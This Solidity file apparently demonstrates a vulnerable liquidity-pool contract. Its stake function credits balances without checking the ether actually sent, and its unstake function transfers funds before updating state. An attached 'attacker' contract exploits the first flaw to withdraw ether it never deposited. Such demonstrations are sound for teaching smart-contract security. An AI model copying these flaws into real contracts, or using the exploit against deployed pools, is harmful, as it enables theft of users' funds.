// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

contract LiquidityPool is Ownable,Pausable {




    function unpause() public onlyOwner {
        _unpause();
    }

    function pause() public onlyOwner {
        _pause();
    }
 constructor() {}
     event Stake(address liquidityProvider, uint256 amount);
    event Unstake(address liquidityProvider, uint256 amount);
    mapping(address=>uint256) public StakerLiquidity;
     function stake (uint256 _amount) public payable whenNotPaused {
         require(_amount>0,"stake must be greater than zero");
         StakerLiquidity[msg.sender] = StakerLiquidity[msg.sender] + _amount;
          //State Change before transfer to contract
            emit Stake(msg.sender,_amount);
     }

     function unstake (uint256 _amount) public whenNotPaused {
         require(_amount>0,"stake must be greater than zero");
         payable(msg.sender).transfer(_amount);
         StakerLiquidity[msg.sender] = StakerLiquidity[msg.sender] - _amount;
         //State Change after transfer from contract
        emit Unstake(msg.sender,_amount);
     }

}

contract attacker{


function attack_1(address _contract) public {
    LiquidityPool(_contract).stake(100000000000000000000);
    LiquidityPool(_contract).unstake(100000000000000000000);
}


}